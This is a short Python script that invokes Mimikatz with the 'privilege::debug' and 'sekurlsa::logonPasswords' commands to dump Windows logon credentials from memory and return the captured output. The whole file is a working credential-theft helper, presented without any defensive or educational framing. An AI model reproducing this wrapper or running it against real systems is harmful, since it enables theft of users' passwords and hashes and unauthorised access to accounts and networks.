import subprocess
import sys
import os


def mimikatz():
    cmd = [r"C:\mimikatz_trunk\x64\mimikatz.exe", "privilege::debug","sekurlsa::logonPasswords","exit" ]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         shell=True)
    return p.stdout.read() +p.stderr.read()
#print mimikatz()
#print "Successful!"